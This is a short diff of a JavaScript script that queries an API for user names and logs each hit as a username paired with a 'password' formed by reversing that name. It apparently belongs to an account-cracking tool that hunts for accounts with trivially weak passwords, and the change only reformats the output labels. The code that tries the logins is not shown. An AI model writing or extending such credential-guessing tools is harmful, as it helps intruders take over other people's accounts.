@@ -61,10 +61,10 @@ async function entry(){
     request(options)
         .then(async function(data){
             if(data.body.data[0] != undefined){
-                console.log("   \x1b[32m[GIBSON]\x1b[0m GIBSON FOUND // "+data.body.data[0]["name"]+":"+data.body.data[0]["name"].split("").reverse().join(""))
+                console.log("   \x1b[32m[GIBSON]\x1b[0m GIBSON FOUND //    USERNAME: "+data.body.data[0]["name"]+" //   PASSWORD: "+data.body.data[0]["name"].split("").reverse().join(""))
             }
             if(data.body.data[1] != undefined){
-                console.log("   \x1b[36m[KYLE]\x1b[0m KYLE FOUND // "+data.body.data[1]["name"]+":"+data.body.data[1]["name"].split("").reverse().join(""))
+                console.log("   \x1b[36m[KYLE]\x1b[0m KYLE FOUND //        USERNAME: "+data.body.data[1]["name"]+" //   PASSWORD: "+data.body.data[1]["name"].split("").reverse().join(""))
             }
             current++
             return entry()
